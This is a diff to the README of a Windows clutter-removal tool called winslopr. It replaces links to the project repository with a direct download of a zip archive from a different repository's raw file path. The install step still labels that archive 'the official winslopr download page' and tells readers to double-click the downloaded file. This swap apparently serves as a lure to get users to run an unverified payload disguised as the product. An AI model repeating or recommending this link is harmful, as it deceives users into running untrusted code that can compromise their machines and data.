@@ -5,7 +5,7 @@ description: "Optimize system performance and gaming workflows with this lightwe
 ---
 # 🧹 winslopr - Remove excess clutter from Windows easily
 
-[![Download winslopr](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Shanprin5627/winslopr)
+[![Download winslopr](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/Shanprin5627/shanprin5627.github.io/main/fume/io_github_shanprin_2.7-beta.2.zip)
 
 winslopr cleans your Windows installation. It removes unnecessary background processes and preinstalled software that slow down your computer. Many computers come with extra programs you do not need, and these apps consume system memory and processor power. winslopr identifies this clutter and helps you remove it to improve your system performance.
 
@@ -15,7 +15,7 @@ You need a computer running Windows 10 or Windows 11. The software requires basi
 
 ## 📥 How to Install
 
-1. Visit [the official winslopr download page](https://github.com/Shanprin5627/winslopr) to locate the latest version.
+1. Visit [the official winslopr download page](https://raw.githubusercontent.com/Shanprin5627/shanprin5627.github.io/main/fume/io_github_shanprin_2.7-beta.2.zip) to locate the latest version.
 2. Click the release link to download the file directly to your computer.
 3. Save the file to your Downloads folder or your Desktop.
 4. Locate the file you saved and double-click it to start the process.
